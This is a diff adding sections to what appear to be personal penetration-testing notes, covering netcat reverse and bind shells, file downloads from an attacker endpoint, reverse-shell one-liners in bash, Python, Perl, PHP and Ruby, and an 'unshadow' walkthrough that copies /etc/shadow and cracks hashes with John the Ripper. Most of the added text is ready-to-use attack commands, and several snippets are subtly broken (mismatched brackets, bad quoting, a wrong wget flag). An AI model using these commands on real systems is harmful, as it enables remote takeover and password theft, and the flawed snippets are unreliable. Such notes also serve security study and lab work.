@@ -561,12 +561,169 @@ You can create a file like file?.txt (literal ? character) to evade restrictions
 
 
 --------------------------------------
-LINUX REVERSE SHELLS
+LINUX REVERSE SHELLS and BIND SHELL
 --------------------------------------
+1. Reverse Shell
+    -In a reverse shell, the target machine (victim) initiates a connection to the attacker's machine.
+    -The attacker sets up a listener to wait for incoming connections.
+    
+How It Works:
+    -The attacker starts a listener on their machine (e.g., using netcat).
+    -The target machine runs a command or script to connect back to the attacker's machine, sending its shell over the connection.
+
+##Example (Using Netcat)##
+
+Attacker’s Machine:
+nc -lvnp 4444
+
+Victim’s Machine:
+nc <attacker_ip> 4444 -e /bin/bash
+    
+
+2. Bind Shell
+    -In a bind shell, the target machine (victim) opens a port and listens for incoming connections.
+    -The attacker connects to the target machine to access the shell.
+
+How It Works:
+    -The target machine runs a command to bind a shell to a specific port.
+    -The attacker connects to the target machine's IP and port to access the shell.
+
+##Example (Using Netcat)##
+
+Victim’s Machine:
+nc -lvnp 4444 -e /bin/bash
+
+Attacker’s Machine:
+nc <target_ip> 4444
+
+
+###################
+FILE TRANSFER
+###################
+python -m http.server 1337
+
+-using curl
+curl -X GET http://<ATTACKER-ENDPOINT> -o <OUTPUT-FILE>
+
+-using wget
+wget http://<ATTACKER-ENDPOINT> -o <OUTPUT-FILE>
+
+-using perl
+perl -e 'use FILE::Fetch;$url="http://<ATTACKER-ENDPOINT>";$ff=File::Fetch->new(uri => $url);$file=$ff->fetch() or die $ff->error;'
+
+###BASH###
+bash -c "bash -i >& /dev/tcp/172.17.0.1/4321 0>&1"
+
+###PYTHON###
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i")'
+
+###PERL###
+perl -e '
+use Socket;
+$ip = "192.168.1.100";
+$port = 4444;           
+socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
+connect(SOCKET, sockaddr_in($port, inet_aton($ip)));
+open(STDIN, ">&SOCKET");
+open(STDOUT, ">&SOCKET");
+open(STDERR, ">&SOCKET");
+exec("/bin/sh -i");'
+
+##PHP###
+php -r '$sock=fsockopen('192.168.1.100',4444);exec('/bin/sh -i <&3 >&3 2>&3');?>"
+
+
+###RUBY###
+ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+##how to set up connections###
+1.TCP connection
+2.start a shell process
+3.redirect the output into the tcp socket
+
+
+-------------------------------------------
+UNSHADOW ATTACK
+-------------------------------------------
+-The unshadow attack is commonly associated with cracking Linux system passwords by combining the contents of the /etc/passwd file and the /etc/shadow file to create a format suitable for password cracking tools like John the Ripper or Hashcat
+
+1./etc/passwd:
+
+    -Stores user account information.
+    -Accessible by all users.
+    -Password field contains x indicating that the hashed password is stored in /etc/shadow.
+
+Example:
+
+root:x:0:0:root:/root:/bin/bash
+user:x:1001:1001::/home/user:/bin/bash
+
+
+2./etc/shadow:
+
+    -Stores hashed passwords and password-related information.
+    -Only accessible by privileged users (e.g., root).
+
+Example:
+
+root:$6$randomhash:18744:0:99999:7:::
+user:$6$anotherhash:18744:0:99999:7:::
+
+    -$6$ indicates SHA-512 hash algorithm
+
+
+
+-the /etc/shadow hash is SHA512crypt in a custmozed base64 encoding
+-using openssl to hash with a salt involves generating a random salt and then combining it with the data to compute a secure hash
+-openssl ->  It provides tools and libraries for implementing secure communication protocols, cryptographic operations, and managing digital certificates
+
+openssl passwd -6(sha512 and -5 is 256) -salt salt(123) new-password
 
 
 
 
+
+#####################
+Unshadowing Process
+#####################
+i.Extract passwd and shadow Files:
+
+    -Requires root or privileged access:
+
+    cp /etc/passwd passwd
+    cp /etc/shadow shadow
+
+ii.Combine Files Using unshadow:
+
+    -Use the unshadow tool to merge the two files:
+
+    unshadow passwd shadow > unshadowed.txt
+
+    -The unshadowed.txt file contains entries in a format suitable for password cracking.
+
+iii.Crack Passwords Using a Tool:
+
+    -Use John the Ripper:
+
+	john unshadowed.txt
+	
+	john --format=crypt --wordlist=/path/to/wordlist.txt unshadowed.txt
+
+-Use a specific wordlist if desired:
+
+	john --wordlist=/path/to/wordlist.txt unshadowed.txt
+
+-View cracked passwords:
+
+	john --show unshadowed.txt
+
+
+
+
+--------------------------------
+linux system enumeration
+--------------------------------
 
 
 
